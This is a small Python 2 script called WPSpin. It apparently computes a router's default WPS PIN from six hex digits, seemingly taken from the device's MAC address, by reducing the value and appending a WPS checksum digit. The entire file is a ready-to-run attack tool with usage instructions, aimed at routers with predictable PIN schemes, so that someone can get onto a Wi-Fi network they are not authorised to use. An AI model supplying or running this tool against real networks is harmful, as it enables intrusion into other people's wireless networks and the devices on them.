#!/usr/bin/env python
#
import sys
 
VERSION = 0
SUBVERSION = 2
pine = 123456
def usage():
   print "[+] WPSpin %d.%d " % (VERSION, SUBVERSION)
   print "[*] Usage : python WPSpin.py 123456"
   sys.exit(0)
 
def wps_pin_checksum(pine):
   accum = 0
 
   while(pine):
        accum += 3 * (pine % 10)
        pine /= 10
        accum += pine % 10
        pine /= 10
   return (10 - accum % 10) % 10
 
try:
   if (len(sys.argv[1]) == 6):
        p = int(sys.argv[1] , 16) % 10000000
        print "[+] WPS pin is : %07d%d" % (p, wps_pin_checksum(p))
   else:
        usage()
except Exception:
   usage()